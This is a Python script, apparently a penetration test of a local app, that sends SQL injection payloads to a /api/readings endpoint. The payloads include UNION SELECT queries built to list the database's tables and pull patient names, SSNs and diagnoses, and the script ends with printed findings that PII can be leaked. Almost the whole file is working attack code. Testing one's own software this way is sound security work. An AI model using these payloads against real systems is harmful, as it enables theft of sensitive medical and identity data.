"""
SQL Injection Attack Script
============================
Tests SQL injection vulnerability in /api/readings endpoint
"""

import requests

BASE_URL = "http://localhost:8080"

def test_sql_injection():
    print("\n" + "="*50)
    print("SQL INJECTION ATTACK TEST")
    print("="*50)
    
    # Test payloads
    payloads = [
        ("Normal query", "P1"),
        ("Basic injection", "' OR '1'='1"),
        ("Union attack", "' UNION SELECT 1,2,3,4,5--"),
        ("Extract table names", "' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--"),
        ("Extract patient data", "' UNION SELECT id,name,ssn,diagnosis,'' FROM patients--"),
    ]
    
    for name, payload in payloads:
        print(f"\n[*] Testing: {name}")
        print(f"    Payload: {payload}")
        
        try:
            response = requests.get(f"{BASE_URL}/api/readings", params={"patient_id": payload})
            data = response.json()
            
            if response.status_code == 200:
                print(f"    [SUCCESS] Status: {response.status_code}")
                print(f"    Records returned: {data.get('count', 'N/A')}")
                if data.get('readings'):
                    for reading in data['readings'][:3]:
                        print(f"    -> {reading}")
            else:
                print(f"    [BLOCKED] Status: {response.status_code}")
                print(f"    Response: {data}")
                
        except Exception as e:
            print(f"    [ERROR] {str(e)}")
    
    print("\n" + "="*50)
    print("FINDINGS:")
    print("- SQL injection is POSSIBLE on patient_id parameter")
    print("- Can extract data from other tables (patients)")
    print("- Sensitive PII (SSN) can be leaked")
    print("="*50)

if __name__ == "__main__":
    test_sql_injection()
